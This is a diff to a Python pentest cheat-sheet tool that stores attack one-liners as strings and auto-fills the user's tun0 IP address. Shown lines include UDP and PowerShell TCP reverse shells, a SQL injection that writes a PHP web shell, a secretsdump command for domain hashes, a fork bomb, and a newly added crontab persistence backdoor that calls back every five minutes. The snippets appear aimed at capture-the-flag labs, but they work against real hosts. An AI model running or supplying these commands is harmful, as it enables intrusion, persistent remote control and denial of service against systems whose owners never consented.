@@ -1,3 +1,7 @@
+import os
+from time import sleep
+
+
 class Cheat:
     def __init__(self, name):
         self.name = name
@@ -12,17 +16,21 @@ class Cheat:
 
 
 class Color:
-    HEADER = "\033[95m"
-    OK_BLUE = "\033[94m"
-    OK_CYAN = "\033[96m"
-    OK_GREEN = "\033[92m"
-    WARNING = "\033[93m"
-    FAIL = "\033[91m"
     RESET = "\033[0m"
     BOLD = "\033[1m"
     GRAY = "\033[90m"
+    FAIL = "\033[91m"
+    OK_GREEN = "\033[92m"
+    WARNING = "\033[93m"
+    OK_BLUE = "\033[94m"
+    HEADER = "\033[95m"
+    OK_CYAN = "\033[96m"
 
 
+ip = os.popen("""/bin/ip add | grep "tun0" | grep "inet" | tr "/" " " | awk '{print$2}'""").read().strip()
+
+if ip in "":
+	ip = "x.x.x.x"
 cheatList = []
 
 ######################################
@@ -358,7 +366,7 @@ bash -c 'exec sh -i &>/dev/udp/10.10.14.53/443 <&1'
 
 reverseShell_Win = Cheat("Basic and advanced Reverse Shells - Windows")
 reverseShell_Win.category = "Windows"
-reverseShell_Win.subCategory = "Reverse Shells"
+reverseShell_Win.subCategory = "Reverse Shell"
 reverseShell_Win.output = """[*] Simple one liner to get a reverse Shell TCP Windows
 
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.53',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
@@ -844,7 +852,7 @@ cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/
 ######################################
 ######################################
 
-fileTransfereLinux = Cheat("File Transfere Linux - nc / ftp / lftp")
+fileTransfereLinux = Cheat("File Transfere Linux - nc / ftp / lftp / scp")
 fileTransfereLinux.category = "Linux"
 fileTransfereLinux.subCategory = "File Transfere"
 fileTransfereLinux.output = """[*] File Transfere Techniques With nc - Linux
@@ -870,6 +878,14 @@ ftp > mget *
 [*] Login oneLiner with crdentials
 
 lftp -u anonymous,'' 10.10.10.184
+
+[*] Copy files via secure copy (scp)
+
+# Upload file
+scp /local/directory/fileName username@x.x.x.x:/remote/directory/fileName 
+
+# Download file
+scp username@x.x.x.x:/remote/directory/fileName /local/directory/fileName
 """
 
 ######################################
@@ -1768,4 +1784,26 @@ secredump.subCategory = "RPC"
 secredump.output = """[*] Get all hashes os all domain users
 
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
+"""
+
+######################################
+######################################
+
+forkBomb = Cheat("Fork Bomb")
+forkBomb.category = "Linux"
+forkBomb.subCategory = "Utility"
+forkBomb.output = """[*] Fork Bomb - Creates processes until system "crashes"
+
+:(){:|:&};:
+"""
+
+######################################
+######################################
+
+linuxPersistenceReverseShell = Cheat("Reverse Shell - Persistent Reverse Collectors")
+linuxPersistenceReverseShell.category = "Linux"
+linuxPersistenceReverseShell.subCategory = "Reverse Shell"
+linuxPersistenceReverseShell.output = f"""[*] Persistent reverse shell backdoor via crontab
+
+(touch .tab ; echo "*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/{ip}/443 0>&1'" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1
 """
